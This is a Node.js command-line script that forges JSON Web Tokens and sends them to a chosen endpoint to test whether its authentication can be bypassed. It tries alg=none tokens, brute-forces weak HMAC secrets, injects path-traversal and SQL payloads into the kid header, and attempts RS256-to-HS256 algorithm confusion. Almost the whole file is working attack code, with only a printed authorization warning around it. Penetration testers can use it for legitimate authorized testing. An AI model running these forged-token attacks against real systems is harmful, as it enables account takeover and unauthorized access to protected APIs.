#!/usr/bin/env node
// jwt-test.mjs — JWT attack tester (none-alg, weak secret, kid injection,
// alg confusion). Pure Node 18+, no external deps.
// OWASP: A07 Identification & Authentication / API2:2023.

'use strict';

import { argv, exit, stdout, stderr } from 'node:process';
import { mkdirSync, writeFileSync } from 'node:fs';
import { createHmac, createSign } from 'node:crypto';
import { join } from 'node:path';

const SCRIPT_NAME = 'jwt-test';

const DEFAULT_WORDLIST = [
  'secret', 'password', '123456', 'key', 'Secret', 'admin',
  'changeme', 'test', 'jwt', 'jwtsecret', 'mysecret', 'mysecretkey',
];

function usage() {
  stdout.write(`Usage: jwt-test.mjs --target <url> --token <jwt> [options]

JWT attack suite. Probes:
  1. alg=none acceptance
  2. weak HMAC secrets (built-in dictionary + optional --wordlist)
  3. kid header injection (path traversal + SQL)
  4. RS256 -> HS256 alg confusion (requires --public-key)

Options:
  --target <url>              Endpoint that consumes the JWT (Authorization: Bearer)
  --token <jwt>               Original JWT to mutate
  --header <name=value>       Extra header (repeatable)
  --auth-header <name>        Header to send the token in (default: Authorization)
  --auth-prefix <prefix>      Token prefix (default: "Bearer ")
  --wordlist <file>           Newline-delimited additional secrets
  --public-key <file>         PEM public key for RS->HS confusion test
  --out <dir>                 Output directory (default: ./security-out/${SCRIPT_NAME}/<ts>/)
  --severity-threshold <s>    low|medium|high|critical (default: high)
  --success-codes <list>      Comma-separated HTTP codes treated as "accepted"
                              (default: 200,201,204)
  -h, --help                  Show help

Example:
  jwt-test.mjs --target https://api.example.com/me --token eyJhbGciOi...
`);
}

function parseArgs(args) {
  const opts = {
    target: '', token: '', headers: {}, authHeader: 'Authorization',
    authPrefix: 'Bearer ', wordlist: '', publicKey: '', out: '',
    severityThreshold: 'high', successCodes: [200, 201, 204],
  };
  for (let i = 2; i < args.length; i++) {
    const a = args[i];
    const next = () => args[++i];
    switch (a) {
      case '-h': case '--help': usage(); exit(0); break;
      case '--target': opts.target = next(); break;
      case '--token': opts.token = next(); break;
      case '--header': {
        const [k, v] = next().split('=');
        opts.headers[k] = v ?? '';
        break;
      }
      case '--auth-header': opts.authHeader = next(); break;
      case '--auth-prefix': opts.authPrefix = next(); break;
      case '--wordlist': opts.wordlist = next(); break;
      case '--public-key': opts.publicKey = next(); break;
      case '--out': opts.out = next(); break;
      case '--severity-threshold': opts.severityThreshold = next(); break;
      case '--success-codes':
        opts.successCodes = next().split(',').map((s) => parseInt(s, 10));
        break;
      default:
        stderr.write(`Unknown option: ${a}\n`); usage(); exit(64);
    }
  }
  return opts;
}

function b64urlEncode(buf) {
  return Buffer.from(buf).toString('base64')
    .replace(/=+$/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}
function b64urlDecode(str) {
  const pad = str.length % 4 === 0 ? '' : '='.repeat(4 - (str.length % 4));
  return Buffer.from(str.replace(/-/g, '+').replace(/_/g, '/') + pad, 'base64');
}
function decodeJwt(token) {
  const [h, p, s] = token.split('.');
  if (!h || !p) throw new Error('Malformed JWT');
  return {
    header: JSON.parse(b64urlDecode(h).toString('utf8')),
    payload: JSON.parse(b64urlDecode(p).toString('utf8')),
    signature: s || '',
  };
}
function reEncodeUnsigned(header, payload) {
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  return `${h}.${p}.`;
}
function reEncodeHs256(header, payload, secret) {
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  const sig = b64urlEncode(createHmac('sha256', secret).update(`${h}.${p}`).digest());
  return `${h}.${p}.${sig}`;
}

async function probe(opts, token, label) {
  const headers = { ...opts.headers, [opts.authHeader]: `${opts.authPrefix}${token}` };
  const start = Date.now();
  let res, body = '', error = null;
  try {
    res = await fetch(opts.target, { method: 'GET', headers });
    body = await res.text();
  } catch (e) {
    error = e.message;
  }
  return {
    label,
    status: res?.status ?? null,
    accepted: !!res && opts.successCodes.includes(res.status),
    bodyPreview: body.slice(0, 240),
    durationMs: Date.now() - start,
    error,
  };
}

async function attackNone(opts, decoded) {
  const header = { ...decoded.header, alg: 'none' };
  const tok = reEncodeUnsigned(header, decoded.payload);
  return probe(opts, tok, 'alg=none');
}
async function attackWeakSecret(opts, decoded) {
  const list = [...DEFAULT_WORDLIST];
  if (opts.wordlist) {
    try {
      const fs = await import('node:fs/promises');
      const extra = (await fs.readFile(opts.wordlist, 'utf8'))
        .split('\n').map((s) => s.trim()).filter(Boolean);
      list.push(...extra);
    } catch (e) {
      stderr.write(`Warning: cannot read --wordlist ${opts.wordlist}: ${e.message}\n`);
    }
  }
  const header = { ...decoded.header, alg: 'HS256' };
  const results = [];
  for (const secret of list) {
    const tok = reEncodeHs256(header, decoded.payload, secret);
    const r = await probe(opts, tok, `weak-secret:${secret}`);
    results.push(r);
    if (r.accepted) break; // stop at first success
  }
  return results;
}
async function attackKidInjection(opts, decoded) {
  const payloads = [
    '../../../../dev/null',
    '/dev/null',
    "' OR '1'='1",
    '../../../../../../etc/passwd',
  ];
  const results = [];
  for (const kid of payloads) {
    const header = { ...decoded.header, alg: 'HS256', kid };
    const tok = reEncodeHs256(header, decoded.payload, '');
    results.push(await probe(opts, tok, `kid-injection:${kid}`));
  }
  return results;
}
async function attackAlgConfusion(opts, decoded) {
  if (!opts.publicKey) return { label: 'alg-confusion', skipped: 'no --public-key' };
  const fs = await import('node:fs/promises');
  let pem;
  try { pem = await fs.readFile(opts.publicKey, 'utf8'); }
  catch (e) { return { label: 'alg-confusion', skipped: e.message }; }
  const header = { ...decoded.header, alg: 'HS256' };
  // Use the PEM bytes as the HMAC key — classic RS->HS confusion.
  const tok = reEncodeHs256(header, decoded.payload, pem);
  return probe(opts, tok, 'alg-confusion(RS->HS)');
}

async function main() {
  stderr.write(`[!] AUTHORIZATION REQUIRED
[!] jwt-test.mjs sends mutated JWTs to ${SCRIPT_NAME} target.
[!] Run only against systems you own or have written permission to test.
`);
  const opts = parseArgs(argv);
  if (!opts.target || !opts.token) {
    stderr.write('Error: --target and --token are required.\n');
    usage();
    exit(64);
  }
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const outDir = opts.out || join('./security-out', SCRIPT_NAME, ts);
  mkdirSync(outDir, { recursive: true });

  const decoded = decodeJwt(opts.token);
  const report = {
    target: opts.target, header: decoded.header, payload: decoded.payload,
    timestamp: ts, attacks: {},
  };

  report.attacks.none = await attackNone(opts, decoded);
  report.attacks.weakSecret = await attackWeakSecret(opts, decoded);
  report.attacks.kidInjection = await attackKidInjection(opts, decoded);
  report.attacks.algConfusion = await attackAlgConfusion(opts, decoded);

  writeFileSync(join(outDir, 'report.json'), JSON.stringify(report, null, 2));

  const flat = [
    report.attacks.none,
    ...(Array.isArray(report.attacks.weakSecret) ? report.attacks.weakSecret : []),
    ...(Array.isArray(report.attacks.kidInjection) ? report.attacks.kidInjection : []),
    report.attacks.algConfusion,
  ].filter(Boolean);

  const accepted = flat.filter((r) => r && r.accepted);

  stderr.write(`---\nTarget: ${opts.target}\n`);
  for (const r of flat) {
    stderr.write(`  ${r.label?.padEnd(34) || '?'} ` +
      `status=${r.status ?? 'ERR'} accepted=${!!r.accepted} ` +
      `${r.error ? 'error=' + r.error : ''}\n`);
  }
  stderr.write(`Accepted: ${accepted.length}\nReport: ${join(outDir, 'report.json')}\n`);

  if (!['low', 'medium', 'high', 'critical'].includes(opts.severityThreshold)) {
    stderr.write(`Invalid --severity-threshold: ${opts.severityThreshold}\n`);
    exit(64);
  }
  if (accepted.length > 0) exit(1);
  exit(0);
}

main().catch((e) => { stderr.write(`Fatal: ${e.stack || e.message}\n`); exit(3); });
